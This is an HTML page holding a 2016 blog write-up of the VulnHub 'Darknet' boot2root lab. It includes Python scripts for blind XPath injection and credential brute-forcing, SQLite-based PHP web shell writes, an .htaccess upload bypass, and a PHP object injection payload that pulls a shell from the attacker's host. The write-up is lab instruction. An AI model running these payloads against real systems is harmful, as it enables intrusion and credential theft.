<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>rooting darknet | #!/bin/note
</title>
<meta name=keywords content="darknet,vulnhub,ctf,writeup">
<meta name=description content="Its been a while since I have done a vulnerable boot2root from @VulnHub. So, I decided to pick up where I last left. After paging back from the latest VM&rsquo;s to where I roughly stopped last year, my attention was drawn to Darknet by @Q3rv0.

     


This is how I managed to solve a VM that totally kicked my ass! While I was solving this VM, I also tried out a Kali Docker image! This actually worked out great.">
<meta name=author content="Leon Jacobs">
<link rel=canonical href=https://leonjza.github.io/blog/2016/06/16/rooting-darknet/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://leonjza.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://leonjza.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://leonjza.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://leonjza.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://leonjza.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.88.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script><meta property="og:title" content="rooting darknet">
<meta property="og:description" content="Its been a while since I have done a vulnerable boot2root from @VulnHub. So, I decided to pick up where I last left. After paging back from the latest VM&rsquo;s to where I roughly stopped last year, my attention was drawn to Darknet by @Q3rv0.

     


This is how I managed to solve a VM that totally kicked my ass! While I was solving this VM, I also tried out a Kali Docker image! This actually worked out great.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://leonjza.github.io/blog/2016/06/16/rooting-darknet/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2016-06-16T21:54:55+02:00">
<meta property="article:modified_time" content="2016-06-16T21:54:55+02:00"><meta property="og:site_name" content="#!/bin/note
">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="rooting darknet">
<meta name=twitter:description content="Its been a while since I have done a vulnerable boot2root from @VulnHub. So, I decided to pick up where I last left. After paging back from the latest VM&rsquo;s to where I roughly stopped last year, my attention was drawn to Darknet by @Q3rv0.

     


This is how I managed to solve a VM that totally kicked my ass! While I was solving this VM, I also tried out a Kali Docker image! This actually worked out great.">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://leonjza.github.io/posts/"},{"@type":"ListItem","position":3,"name":"rooting darknet","item":"https://leonjza.github.io/blog/2016/06/16/rooting-darknet/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"rooting darknet","name":"rooting darknet","description":"Its been a while since I have done a vulnerable boot2root from @VulnHub. So, I decided to pick up where I last left. After paging back from the latest VM\u0026rsquo;s to where I roughly stopped last year, my attention was drawn to Darknet by @Q3rv0.\n  This is how I managed to solve a VM that totally kicked my ass! While I was solving this VM, I also tried out a Kali Docker image! This actually worked out great.\n","keywords":["darknet","vulnhub","ctf","writeup"],"articleBody":"Its been a while since I have done a vulnerable boot2root from @VulnHub. So, I decided to pick up where I last left. After paging back from the latest VM’s to where I roughly stopped last year, my attention was drawn to Darknet by @Q3rv0.\n  This is how I managed to solve a VM that totally kicked my ass! While I was solving this VM, I also tried out a Kali Docker image! This actually worked out great.\ngetting started Starting with these VM’s is almost always the same story and Darknet was no different. Pick up the VM’s IP address (yes, I still use the VMWare network sniffer sudo /Applications/VMware\\ Fusion.app/Contents/Library/vmnet-sniffer -e vmnet8). 192.168.252.140. On to the nmap!\nroot@kali:~# nmap -v --reason 192.168.252.140 -sV Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-16 20:13 UTC [...] Reason: 998 resets PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 37 Apache httpd 2.2.22 ((Debian)) 111/tcp open rpcbind syn-ack ttl 37 2-4 (RPC #100000) Just tcp/80 to work with really. tcp/111 did not yield anything interesting at first glance, but the most obvious next step was definitely the web port.\n  888.darknet.com The homepage on the web server I have found so far was not very interesting. I scanned it with gobuster hoping to discover some more directories which revealed the existence of an /access folder.\nroot@kali:~# gobuster -u http://192.168.252.140/ -w /usr/share/wordlists/wfuzz/general/common.txt Gobuster v1.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://192.168.252.140/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/wfuzz/general/common.txt [+] Status codes : 200,204,301,302,307 ===================================================== /access (Status: 301) /index (Status: 200) ===================================================== Browsing to http://192.168.252.140/access/ showed that directory indexing was enabled and revealed the 888.darknet.com.backup file.\n  Downloading and inspecting the file, it quickly became apparent that this looked like an Apache Virtual Host configuration.\nroot@kali:~/data/VulnHub/Darknet# cat 888.darknet.com.backup ServerName 888.darknet.com ServerAdmin devnull@darknet.com DocumentRoot /home/devnull/public_html ErrorLog /home/devnull/logs  I took this as a hint that I would have to hack an entry into my local /etc/hosts to resolve 888.darknet.com to 192.168.252.140. After having done that, we are presented with yet another page with a login.\n  888 authentication bypass Natural instinct has it that when you see login pages like these, you just throw some single quotes at the fields to see what happens. I did exactly this and was pleasantly met with an error response along the lines of unrecognized token: \"3590cb8af0bbb9e78c343b52b93773c9\". This just screamed SQL injection! I figured since it seems to be reflecting errors back at the page, sqlmap might just quickly sort out this stage for us without much effort. Nope! After quite a bit of time, I learnt that the SQL injection only appears to be in the username field, but no matter how I tried to get sqlmap to play along, I was inevitably met with [WARNING] POST parameter 'username' is not injectable every time.\nAdmitting defeat, I figured I should stop being lazy and attempt the injection manually. The fact that the error message returned unrecognized token hinted towards the idea that the backend database might be SQLite. This gives me a frame of reference for the SQL dialect to use. Next, the most critical step for the injection to be successful was to try and envision what the query must look like in the backend. I played around quite a bit more, and got he most information out of the error message when I have the value '\"1 as a username and any text as a password.\n  Great. So with \"\"1' and pass='03c7c0ace395d80182db07ae2c30f034'\" as the error message, I theorized that the SQL query might be something along the lines of:\nSELECT * FROM users WHERE user='' and pass='' In the softwares logic then, there may be a requirement to just have a row return to mark the session as logged in. Makes sense right? :) So, in order to attempt an authentication bypass, I will need to try and get the query manipulated in such a way that the query will return a valid row regardless of the password. In SQL, we can have something like SELECT 1 which will just return 1 in the row set.\nroot@kali:~/data/VulnHub/Darknet# sqlite3 SQLite version 3.8.10.2 2015-05-20 18:17:19 Enter \".help\" for usage hints. Connected to a transient in-memory database. Use \".open FILENAME\" to reopen on a persistent database. sqlite SELECT 1; 1 sqlite With this knowledge, we can imagine that we could have the final query the software will execute look something like this:\nSELECT * FROM users WHERE user='a user' or '1' and pass='' In other words, if the injection point is in the user section, the payload we need to execute may be derived as follows:\nSELECT * FROM users WHERE user=' a user' or ‘1 ' and pass=''\nThis obviously begs the requirement to have knowledge of a valid user! Well, remember that Apache Virtual host config file? It mentioned that the server admin is devnull@darknet.com. Admittedly, this took me a while to get to (and maybe a bit of a cheat :P), but using a username of devnull will complete the requirements we have to bypass the authentication needed for this page.\nConsidering the injection point and theorized query, we can use a username of devnull' or 1' and any password to login.\nadministrator sql shell After the login bypass, I was presented with a page titled Administrador SQL.\n  I tried a few queries but quickly realized that no output was returned no matter what you gave it.\nWhile researching some of the possibilities with SQLite injection, I came across this blogpost that details a method of writing arbitrary code to a file of our choosing (obviously assuming we have write access there). Considering I had a fictitious SQL shell now, I jumped right into trying this.\nThe first thing I needed to do though was to find a writable directory. The blogpost mentions that uploads/ and cache/ are usually good candidates (and rightfully so), but it did not seem like the paths existed at http://888.darknet.com/uploads/ and http://888.darknet.com/cache/. So I pulled up gobuster again to see if there are any other directories I could potentially use for this.\nroot@kali:~/data/VulnHub/Darknet# gobuster -u http://888.darknet.com/ -w /usr/share/wordlists/wfuzz/general/common.txt Gobuster v1.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://888.darknet.com/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/wfuzz/general/common.txt [+] Status codes : 302,307,200,204,301 ===================================================== /css (Status: 301) /img (Status: 301) /includes (Status: 301) ===================================================== 3 hits for /css, /img and /includes. Considering I had the VirtualHost configuration file, I also knew that these paths are most probably relative to the DocumentRoot at /home/devnull/public_html. Now, all I had to do was modify the payload as explained in the blogpost and cross my fingers. Without boring you with the nitty gritty details, I finally managed to figure out that I can write to the /img directory and gain some code execution.\nATTACH DATABASE '/home/devnull/public_html/img/phpinfo.php' as pwn; CREATE TABLE pwn.shell (code TEXT); INSERT INTO pwn.shell (code) VALUES ('');   Yeah… look at that. The amount of disable_functions values explain why my initial system() type PHP shells were failing. Nonetheless, I was still able to browse the filesystem with a very rudementary script injected using the SQL shell I still had. The payload was as follows that allowed me to browse around and cat things.\nATTACH DATABASE '/home/devnull/public_html/img/files.php' as pwn; CREATE TABLE pwn.shell (code TEXT); INSERT INTO pwn.shell (code) VALUES (\"\"); Looking at the phpinfo() output, I also noticed the open_basedir value was set to /etc/apache2:/home/devnull:/tmp. This is kinda what motivated me to slap together that quick file browsing script so that I can see whats so interesting in /etc/apache2 (especially since we already had this one vhost config requirement to get to this stage).\nLastly, I also learnt that we are currently the devnull user on a Debian Linux box… Weird. I expected something like www-data but ok.\n  Getting back to the /etc/apache2 thing, I found another VirtualHost configuration file there in /etc/apache2/sites-available/. This was done using the files.php script I wrote and toggling the a parameter to ls or cat as needed. I was not able to find anything else interesting thanks to that epic open_basedir setting :/\n  signal8. so much hate. I added another entry to my /etc/hosts and browsed to the new hostname discovered in that configuration file.\n  Poking around with the new website had a few points of interest but nothing that had any obvious bugs. The URL http://signal8.darknet.com/contact.php?id=1 had something funny going on with the id field though I could not confirm if this was another SQL injection bug or not. A robots.txt also existed for this site and had the entry Disallow: /xpanel/. Browsing to this I was met with a login page.\n  The login page too did not seem to have any obvious bugs. Some quick scans with nikto, sqlmap etc did not show me anything I did not already know.\nfast forward many many hours\nEventually, I resorted to fuzzing all of the fields in the new site that I have found. I literally tested all of them, but again let me not bore you with the failed attempts ;) I will however detail the path that lead to success.\nTo fuzz all of the input fields, I fired up BurpSuite, captured the request to http://signal8.darknet.com/contact.php?id=1 and sent it to Intruder.\n  Intruder was configured to use a simple fuzzing wordlist sourced from /usr/share/wordlists/wfuzz/Injections/All_attack.txt on Kali Linux from the wordlists package. Once the attack finished running, I went to the results and sorted them by response size. It was possible to quickly see in this case that those that returned an email address in the body and those that didn’t based purely on the size. Using this list, I was able to filter out and realize that the payload of count(/child::node()) managed to return a valid result for the id parameter.\n  The first time I saw this I had no idea how much time I would be spending on this particular bug. In fact, I have never come across this before so this was by far the most educational portion of the challenge for me!\nxpath injection Just googling the term count(/child::node()) quickly revealed that this was something that related to XPath. XPath allows you to query XML datasets much like SQL can query databases. Ok great. Next up was a trip to owasp.org and their article on XPATH Injection. I spent quite a bit of time researching this type of vulnerability. I realized that the case I was dealing with here was blind XPath injection. Much like blind SQL injection, blind XPath injection can also be exploited by running ‘queries’ that return true/false. The condition for true in this case was the fact that the email address appeared, and false was that it was missing from the response.\nBy far, this PDF was the most useful in getting me to understand the vulnerability in the most depth.\nBefore I could exploit this bug though, I had to come up with a way to test the theories that I was reading about locally. To do this, I copied some XML that I found in one of the articles to start.\n Arnold Baker ABaker SoSecret Admin  Peter Pan PPan NotTelling User   I then wrote a small PHP script that would allow me to test payloads as if it were injected into the XML on the site I have with the bug. This script looked as follows:\nxpath($xpath); // Return a result of the XPath was valid etc. print 'Blind:' . PHP_EOL; @print_r((string)$result[0]); print PHP_EOL . PHP_EOL; // Show the raw result of the XPath not filtered print 'Raw:' . PHP_EOL; print_r($result); I studied some XPath functions available on devdocs.io. This reference together with what I read online as well as my small test scenario helped me figure that I could make use of the starts-with() XPath function to test for true/false scenarios. This proved to work in my little test environment.\nroot@kali:~/data/VulnHub/Darknet# php readxml.php \"1 and starts-with(name(*[1]),'F')=1\" Injection : 1 and starts-with(name(*[1]),'F')=1 Xpath : //Employee[@ID=1 and starts-with(name(*[1]),'F')=1]/UserName Blind: ABaker Raw: Array ( [0] = SimpleXMLElement Object ( [0] = ABaker ) ) To test this scenario on Darknet, I took a guess at the node name of the field that is being returned as email considering its an email address that is being returned. It is possible to brute force these names as you will see later. To start testing the feasibility of the blind boolean based injection, I entered the payload 1 and starts-with(email, 'e') into the URL.\n  Boom. The email address is returned! This meant that I could run over a large key space and brute force other parts of the underlying XML, hoping to learn more of its structure. For clarities sake, the starts-with() function will later be expanded to be something like 1 and starts-with(email, 'errorlevel'). Using the payload 2 and starts-with(email, 'd') will also return the devnull@darknet.com email address as that email starts with d which makes the XPath query true.\nI was not going to test all of these characters by hand, nope. I had to figure out what this XML looks like, so I wrote some scripts to help with that. The first script attempts to brute force the names of the current node as well as the parent node. If we have these names we can call them in an XPath query by name. For eg, //parent/current/attribute.\nimport requests import string import sys entry_point = 'http://signal8.darknet.com/contact.php' payloads = { # . == current node and .. == parent node 'CurrentNode': '1 and starts-with(name(.),\"{exfil}\")=1', 'ParentNode': '1 and starts-with(name(..),\"{exfil}\")=1', } def w(t): sys.stdout.write(t) sys.stdout.flush() for payload_type, payload in payloads.iteritems(): w(\"\\n{}: \".format(payload_type)) stop = False exfil = '' while not stop: stop = True for char in string.printable: r = requests.get( entry_point, params={ 'id': payload.format(exfil=(exfil + char)) }) if 'darknet.com' in r.text: exfil += char w(char) stop = False print \"\\nDone\" The script in action, determining that the XML has the structure //auth/user:\nI was now able to theorize that the XML may have the following structure when calling user information. //auth/user[@id=1]/email where 1 is the ID of the user in question. I knew about the email field as it was almost obvious. I also discovered the username field by guessing. I tried to apply the same brute force logic as I did to the values, but for some reason I was not getting any luck with payloads where I was trying to address attributes by position, such as with [*1] for the first. This did work in my local test environment but not on Darknet. I had everything I needed to get the credentials for login (I think?), but did not have the passwords.\nEventually I wrote another script to take some words from a wordlist and brute the attribute names, hoping to discover some more attributes!\nimport requests import string import sys entry_point = 'http://signal8.darknet.com/contact.php' payload = '1 and starts-with(name(//auth/user[id=1]/{word}),\"{word}\")=1' with open('/usr/share/wfuzz/wordlist/general/spanish.txt') as f: for word in f.readlines(): word = word.strip() r = requests.get(entry_point, params={'id': payload.format(word=word)}) if 'darknet.com' in r.text: print 'Found attribute: {word}'.format(word=word) Having noticed a large part of the sites have been in Spanish, I eventually used a Spanish wordlist and found the field name clave with it. Urgh, that was mildly frustrating. Anyways, this script in action:\nFinally. username \u0026 clave! As the final piece to this puzzle, I took the original script used to brute force the XML structure and modified the payloads to now brute the values for username and clave! The new payloads were:\n'username': '1 and starts-with((//auth/user[id=1]/username),\"{exfil}\")=1', 'password': '1 and starts-with((//auth/user[id=1]/clave),\"{exfil}\")=1', The brute force script in action with the new payloads:\nSo the username and password combination that lets you login at http://signal8.darknet.com/xpanel/ is errorlevel / tc65Igkq6DF.\nthe ploy Once you have logged in, you presented with a page with a login to Editor PHP.\n  The link to edit.php had little value as it simply appeared to be a ‘troll’ page. I guess the humor here is the fact that code/os command execution has been relatively painful and this may have been a sign of hope.\n  When I viewed the page sources for the page I got when I just logged it, I saw a hint to a ploy.php page.\n  Browsing to ploy.php, I was met with a file upload and a series of checkboxes to tick.\n  It very quickly became obvious that you have to select the right combination of checkboxes in order to be allowed to upload anything. Each checkbox had a numeric value, so I copied this out into a script and proceeded to try all of the combinations possible. I knew a combination was correct if the Spanish term Key incorrecta! was not in the response. With some manual fiddling, I also learnt that the key was 4 integers long. Attempting a combination with more or less than 4 keys meant that the HTTP response had La longitud de la clave no es la correcta!\nimport requests import itertools import sys VALUES = [37, 12, 59, 58, 72, 17, 22, 10, 99] PIN = None s = requests.Session() def w(text): sys.stdout.write('\\r' + text) sys.stdout.flush() # Need a valid session before we can continue. print('[+] Logging in') s.post('http://signal8.darknet.com/xpanel/index.php', data={ 'username': 'errorlevel', 'password': 'tc65Igkq6DF', }) print('[+] Bruting PIN Code ...') for c in itertools.permutations(VALUES, 4): w(\"{pin}\".format(pin=', '.join(map(str, c)))) r = s.post('http://signal8.darknet.com/xpanel/ploy.php', files={'imag': open('test_image.png', 'rb')}, data={ 'checkbox[]': c, 'Action': 'Upload', }) if 'incorrecta' not in r.text: print('\\n[+] Found pin: {pin}'.format(pin=', '.join(map(str, c)))) break Seeing this script in action would look as follows:\nSo the pin code was 37, 10, 59, 17. Easy.\nThe next obvious step was to try and figure out how we can weaponize this file upload, if at all. The file upload appeared to accept most uploads except for those ending in .php. Uploading a PHP script would return the error Formato invalido! Things like images (or almost anything that was not useful) responded with Subida exitosa!\nI managed to discover a uploads/ directory with gobuster again that helped me locate the uploaded files that I was uploading. The filenames appeared to remain intact which made things a little easier. But, this did not help me. I really hoped for some code execution.\nfast forward even more hours\nEventually, I came across some PHP file upload bypass techniques that involve .htaccess files. The premise being that if its possible to write/overwrite a folders .htaccess, then it may be possible to add a tiny backdoor shell to a folder. Sneaky! The only real requirement was that the VirtualHost configuration had to allow for .htaccess files to be read. As I had already downloaded the configuration file for signal8.darknet.com, I could quickly see that AllowOverride was set to All. Fantastic!\nI picked a shell from the https://github.com/wireghoul/htshells repository here. From my previous testing, I wrote a small uploader so that I wouldn’t have to click those checkboxes all the time.\nimport requests import sys import os.path as path s = requests.Session() def w(text): sys.stdout.write('\\r' + text) sys.stdout.flush() print('[+] Logging in ...') s.post('http://signal8.darknet.com/xpanel/index.php', data={ 'username': 'errorlevel', 'password': 'tc65Igkq6DF', }) print('[+] Uploading : {file}'.format(file=sys.argv[1])) r = s.post('http://signal8.darknet.com/xpanel/ploy.php', files={'imag': open(sys.argv[1], 'rb')}, data={ 'checkbox[]': [37, 10, 59, 17], 'Action': 'Upload', }) if 'Subida exitosa' in r.text: print('[+] Upload successful! Try: http://signal8.darknet' '.com/xpanel/uploads/{file}'.format(file=path.basename(sys.argv[1]))) elif 'Formato invalido' in r.text: print('[!] Upload failed. Invalid format.') else: print('[!] Upload failed, unknown error.') All I had to do was runt his script, providing the filename that I want to upload and viola.\nroot@kali:~/data/VulnHub/Darknet# python bruteUploader.py .htaccess [+] Logging in ... [+] Uploading : .htaccess [+] Upload successful! Try: http://signal8.darknet.com/xpanel/uploads/.htaccess Once uploaded, I browsed to the location and was met with what looks like some code execution again!\n  As expected, the OS command execution does not work due to all those disable_functions, but we have PHP code execution so that was a start! I decided that for this one I wanted to try get a more fully featured shell working. So, I edited the .htaccess to include a web shell that I was working quite some time ago (and finally kinda finished). I packed the shell and replaced the PHP in the .htaccess with the more fully featured shells packed source.\n# # Uncomment the line below for Apache2.4 and newer # Require all granted Order allow,deny Allow from all  # Make .htaccess file be interpreted as php file. This occur after apache has interpreted # the apache directoves from the .htaccess file AddType application/x-httpd-php .htaccess ###### SHELL ###### --Uploaded this with my upload helper and boom, a better shell.\n  the last hurdle(s) Wtf. The current user is errorlevel… I double checked and saw that previously we were the devnull user. This had me pretty confused in the beginning and had me spend quite a bit of time to figure out how this is possible. From the phpinfo() output we had no open_basedir restriction so that allowed me to move around the filesystem much more freely than before. I also noticed that I am not able to access the home directory for the errorlevel user so I couldn’t really figure out what was going on in there (the red color indicates read/write is not possible).\n  Eventually, I discovered the use of suPHP as a loaded module. This basically means that the PHP script will run as the owner of the file. So with that theory, its sane to assume that because errorlevel owns the PHP files in the users home directory, that is why I am seen as that user too.\nAnyways, some more enumeration later, I discover some more PHP scripts in /var/www. These were owned by root, meaning that if there are any vulnerabilities, I could effectively become root!\n  Due to the fact that these were in /var/www, I could just browse to the IP address of the VM and run these scripts. Calling the sec.php script caused the server to return an HTTP 500 error.\n  As I was able to read the files in /var/www, I also downloaded sec.php to get an idea of what its supposed to be doing.\nThe call to unserialize() immediately hinted me towards what the next step would need to be. I continued to download the files that are required in the Classes/ folder.\nTest.php\nurl); $f=fopen($this-path.\"/\".$this-name_file, \"w\"); fwrite($f, $data); fclose($f); chmod($this-path.\"/\".$this-name_file, 0644); } } ? Show.php\nwoot=\"ROOT\"; } } ? A textbook example of PHP Object Injection! I continued to serialize an instance of of the Show class by copying the class into a new PHP file, instantiating the Show class and running the serialize() function over it, printing the output.\n// Source code for poishow.php woot=\"ROOT\"; } } print_r(serialize(new Show())); Running this with a PHP interpreter printed the serialized string.\nroot@kali:~/data/VulnHub/Darknet# php poishow.php O:4:\"Show\":1:{s:4:\"woot\";N;} I now had something I could use to try and test the vulnerability. For the Show class, we are going to leverage the __toString() method defined when sec.php calls echo on the variable containing the unserialized object. I write yet another python helper to send the serialized objects to the sec.php as a POST parameter. This was mostly because I was too lazy to deal with my shell and escaping the quotes etc. :)\nimport requests OBJECT = \"\"\"O:4:\"Show\":1:{s:4:\"woot\";N;}\"\"\" print('[+] Exploiting the PHP Object Injection Bug') r = requests.post('http://192.168.252.140/sec.php', data={'test': OBJECT}) print r.status_code print r.text Running this made the server still respond with an HTTP 500 error. Hmm. I was stuck here for quite some time trying to figure out if I can get some form of logging somewhere that I can read. At some stage, I came across /etc/suphp and realized that the configuration file for it is writable.\n  The suphp.conf file had an entry logfile=/var/log/suphp/suphp.log which I changed to log to /tmp, hoping for it to reveal some information about the error code I was getting. To do this, I downloaded the file, modified the entry, and used my web shell’s upload functionality to override the original configuration file. This worked just fine, apart from the fact that that logfile too was not readable by me :(\nSome time later, I realized that there were two more configuration options in the configuration file that are of interest.\n; Minimum UID min_uid=100 ; Minimum GID min_gid=100 Remember that the PHP scripts we are trying to access are owned by root? Turns out that this is a security feature of suPHP to prevent scripts with too high permissions to run. So, I modify the configuration file again to replace the values with 0 and upload it to override the original.\n  This time, when I try and access the sec.php script, I am provided with no output. Great! Back to the original Object Injection that I was trying to exploit, I rerun my python script to test the unserialize().\nroot@kali:~/data/VulnHub/Darknet# python phpObjectInjection.py [+] Exploiting the PHP Object Injection Bug 200 Showme The Showme output is expected as the __toString() method is set to return this when the class should be represented as a string. Neat.\nThe next step was then to serialize an object with my desired values for the Test class’s properties. Following the logic of the __destruct() method, it was clear to see that it would call a URL, write the contents to file and chmod the file accordingly. To do this, I added the Test class and set the values in my original script.\nwoot=\"ROOT\"; } } class Test { public $url; public $name_file; public $path; function __destruct(){ # Commented out as this will run when this script # also finishes :D #$data=file_get_contents($this-url); #$f=fopen($this-path.\"/\".$this-name_file, \"w\"); #fwrite($f, $data); #fclose($f); #chmod($this-path.\"/\".$this-name_file, 0644); } } $test = new Test(); $test-url = 'http://192.168.252.1:8000/shell.txt'; $test-name_file = 'pop.php'; $test-path = '/var/www'; print_r(serialize([$test, new Show()])); Running this would then print out the serialized versions of the two classes in question.\nroot@kali:~/data/VulnHub/Darknet# php poi.php a:2:{i:0;O:4:\"Test\":3:{s:3:\"url\";s:35:\"http://192.168.252.1:8000/shell.txt\";s:9:\"name_file\";s:7:\"pop.php\";s:4:\"path\";s:8:\"/var/www\";}i:1;O:4:\"Show\":1:{s:4:\"woot\";N;}} The only thing that is left to do is host the shell.txt file at the location specified in the $url property and run the little python helper with the new serialized string. I started up a HTTP server with python -m SimpleHTTPServer and wrote my web shell to shell.txt. The python helper was changed so that OBJECT had the new serialized string.\nOBJECT = \"\"\"a:2:{i:0;O:4:\"Test\":3:{s:3:\"url\";s:35:\"http://192.168.252.1:8000/shell.txt\";s:9:\"name_file\";s:7:\"pop.php\";s:4:\"path\";s:8:\"/var/www\";}i:1;O:4:\"Show\":1:{s:4:\"woot\";N;}}\"\"\" I ran the helper and saw that the shell.txt was downloaded from my web server. I could now browse to http://192.168.252.140/pop.php :D\nflag Using the shell uploaded, I was finally able to cat the flag!\n  final thoughts I went back to a few of the source files to get an idea for whats going on once the box was rooted. The first being the weirdness when I tried to brute force the first elements of the node in the XPath injection. Turns out, a preg_match() was applied to filter out a few inputs.\nif(!empty($_GET['id'])){ $id=$_GET['id']; if(preg_match('/\\*/', $id)){ exit(); } Next, the original SQL injection bug was also filtering out some input.\nif(preg_match(\"/select|and|[,=In the end, I learnt a lot! Thanks @Q3rv0\n","wordCount":"4660","inLanguage":"en","datePublished":"2016-06-16T21:54:55+02:00","dateModified":"2016-06-16T21:54:55+02:00","author":{"@type":"Person","name":"Leon Jacobs"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://leonjza.github.io/blog/2016/06/16/rooting-darknet/"},"publisher":{"@type":"Organization","name":"#!/bin/note\n","logo":{"@type":"ImageObject","url":"https://leonjza.github.io/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://leonjza.github.io accesskey=h title="#!/bin/note
 (Alt + H)">#!/bin/note
</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://leonjza.github.io/about/ title="About Me">
<span>About Me</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/archives title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/categories title=Categories>
<span>Categories</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/search/ title="Search (Alt + /)" accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://leonjza.github.io>Home</a>&nbsp;»&nbsp;<a href=https://leonjza.github.io/posts/>Posts</a></div>
<h1 class=post-title>
rooting darknet
</h1>
<div class=post-meta>June 16, 2016&nbsp;·&nbsp;22 min&nbsp;·&nbsp;Leon Jacobs&nbsp;|&nbsp;<a href=https://github.com/leonjza/leonjza.github.io/tree/source/content/posts/2016-06-16-rooting-darknet.markdown rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div>
</header> <div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul><ul>
<li>
<a href=#getting-started aria-label="getting started">getting started</a></li>
<li>
<a href=#888darknetcom aria-label=888.darknet.com>888.darknet.com</a></li>
<li>
<a href=#888-authentication-bypass aria-label="888 authentication bypass">888 authentication bypass</a></li>
<li>
<a href=#administrator-sql-shell aria-label="administrator sql shell">administrator sql shell</a></li>
<li>
<a href=#signal8-so-much-hate aria-label="signal8. so much hate.">signal8. so much hate.</a></li>
<li>
<a href=#xpath-injection aria-label="xpath injection">xpath injection</a></li></ul>
<li>
<a href=#the-ploy aria-label="the ploy">the ploy</a><ul>
<li>
<a href=#the-last-hurdles aria-label="the last hurdle(s)">the last hurdle(s)</a></li>
<li>
<a href=#flag aria-label=flag>flag</a></li>
<li>
<a href=#final-thoughts aria-label="final thoughts">final thoughts</a>
</li>
</ul>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><p>Its been a while since I have done a vulnerable boot2root from <a href=https://twitter.com/vulnhub>@VulnHub</a>. So, I decided to pick up where I last left. After paging back from the latest VM&rsquo;s to where I roughly stopped last year, my attention was drawn to <a href=https://www.vulnhub.com/entry/darknet-10,120/>Darknet</a> by <a href=https://twitter.com/Q3rv0>@Q3rv0</a>.</p>
<figure>
<img loading=lazy src=/images/darknet_logo.png>
</figure>
